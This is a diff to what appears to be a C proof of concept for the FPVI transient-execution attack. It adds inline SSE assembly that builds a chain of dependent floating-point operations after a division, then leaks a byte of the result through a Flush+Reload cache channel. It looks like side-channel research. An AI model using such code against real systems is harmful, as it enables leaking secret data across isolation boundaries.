@@ -130,7 +130,21 @@ int main(int argc, char *argv[]) {
             mfence();
 
            // 2. FPVI 
-            double z = dX / dY;
+            double z, temp1, temp2;
+            asm volatile(
+                "movsd %[x], %%xmm0\n"
+                "movsd %[y], %%xmm1\n"
+                "divsd %%xmm1, %%xmm0\n"      // z = x / y
+                "movapd %%xmm0, %%xmm2\n"     // temp1 = z
+                "addsd %%xmm0, %%xmm2\n"      // temp1 = z + z (dipendente!)
+                "mulsd %%xmm2, %%xmm0\n"      // z = z * temp1 (dipendente!)
+                "movsd %%xmm0, %[z]\n"
+                : [z] "=m" (z)
+                : [x] "m" (dX), [y] "m" (dY)
+                : "xmm0", "xmm1", "xmm2"
+            );
+
+            // SUBITO dopo leak
             uint8_t byte = ((uint8_t*)&z)[byte_index];
             *(volatile char*)(&reloadbuffer[byte * STRIDE]);
 
